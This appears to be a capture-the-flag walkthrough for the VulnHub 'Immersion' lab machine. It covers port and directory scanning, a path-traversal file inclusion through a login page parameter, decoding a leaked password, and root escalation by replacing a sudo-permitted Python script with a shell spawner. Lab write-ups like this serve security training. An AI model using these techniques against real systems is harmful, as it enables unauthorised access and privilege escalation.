---
title: "ColddWorld: Immersion Walkthrough"
description: "Immersion VulnHub CTF walkthrough"
---

{% highlight text %}
Will you be able to do the dive and take out both flags on this machine?

Please share your feedback: "https://twitter.com/C0ldd__”
{% endhighlight %}


nmap 
{% highlight terminal %}
┌──(kali㉿kali)-[~]
└─$ nmap -p- -sV 192.168.56.153
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-01 08:14 EDT
Nmap scan report for 192.168.56.153
Host is up (0.0011s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
3042/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
{% endhighlight %}
gobuster output:
{% highlight terminal %}
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://192.168.56.153/ -x php,txt,html -q
/index.html           (Status: 200) [Size: 401]
/login                (Status: 301) [Size: 316] [--> http://192.168.56.153/login/]
/css                  (Status: 301) [Size: 314] [--> http://192.168.56.153/css/]  
/wp                   (Status: 301) [Size: 313] [--> http://192.168.56.153/wp/]   
/secure               (Status: 301) [Size: 317] [--> http://192.168.56.153/secure/]
/js                   (Status: 301) [Size: 313] [--> http://192.168.56.153/js/]
{% endhighlight %}

From the login page: 
{% highlight text %}
Hi Carls, if you read this, I have gone on a trip, let me tell you,
after the last attack we received (thanks to your inactivity as a web
developer) we had to make password changes, but since he doesn't use a mobile phone
or home computers (a bit weird since you are a web developer), I left clues on the "page"
for you to find your password, I know it will be easy because you are
good for detecting security flaws (or so I thought before the attack :D), I leave your password in a file called carls.txt that is inside /var, when you get it,
log in and finish your work by preparing my bash.
{% endhighlight %}
Take note of the "pages" hint. 
Exploiting LFI on the login page: 
http://192.168.56.153/login/account.php?page=../../../carls.txt

carls:Y2FybG9z

{% highlight terminal %}
┌──(kali㉿kali)-[~]
└─$ echo "Y2FybG9z" | base64 -d                                             130 ⨯
carlos
{% endhighlight %}

Checking sudo -l to see what carls can run as another user
{% highlight terminal %}
carls@Immersion:~$ sudo -l
[sudo] password for carls: 
Coincidiendo entradas por defecto para carls en Immersion:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

El usuario carls puede ejecutar los siguientes comandos en Immersion:
    (c0ldd : c0ldd) /bin/bash
carls@Immersion:~$ 
{% endhighlight %}
Switching to the c0ldd user: 
{% highlight terminal %}
carls@Immersion:~$ sudo -u c0ldd /bin/bash
c0ldd@Immersion:~$ 
{% endhighlight %}

Checking sudo privileges with sudo -l

{% highlight terminal %}
c0ldd@Immersion:~$ sudo -l
Coincidiendo entradas por defecto para c0ldd en Immersion:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

El usuario c0ldd puede ejecutar los siguientes comandos en Immersion:
    (root) NOPASSWD: /usr/bin/python3 /home/c0ldd/DoNotRun.py
c0ldd@Immersion:~$ 
{% endhighlight %}

Enumerating local files for the c0ldd user: 
{% highlight terminal %}
c0ldd@Immersion:/home/c0ldd$ cat user.txt 
TXV5IGJpZW4gaGVjaG8gOik=
{% endhighlight %}

Can't overwrite the file but we can delete it and create a new version of the 
script to be run as root!
{% highlight terminal %}
c0ldd@Immersion:/home/c0ldd$ rm DoNotRun.py 
rm: ¿borrar el fichero regular 'DoNotRun.py'  protegido contra escritura? (s/n) y
c0ldd@Immersion:/home/c0ldd$ ls -a
.   .bash_history  .bashrc  .nano     .sudo_as_admin_successful
..  .bash_logout   .cache   .profile  user.txt
c0ldd@Immersion:/home/c0ldd$ touch DoNotRun.py
c0ldd@Immersion:/home/c0ldd$ vim DoNotRun.py 
c0ldd@Immersion:/home/c0ldd$ ls
DoNotRun.py  user.txt
c0ldd@Immersion:/home/c0ldd$ cat DoNotRun.py 
import pty
pty.spawn("/bin/bash")

c0ldd@Immersion:/home/c0ldd$ sudo -u root /usr/bin/python3 /home/c0ldd/DoNotRun.py 
root@Immersion:/home/c0ldd# 
{% endhighlight %}

Getting the root flag: 
{% highlight terminal %}
root@Immersion:/root# cat root.txt 
RmVsaWNpZGFkZXMgY3JhY2s=
{% endhighlight %}



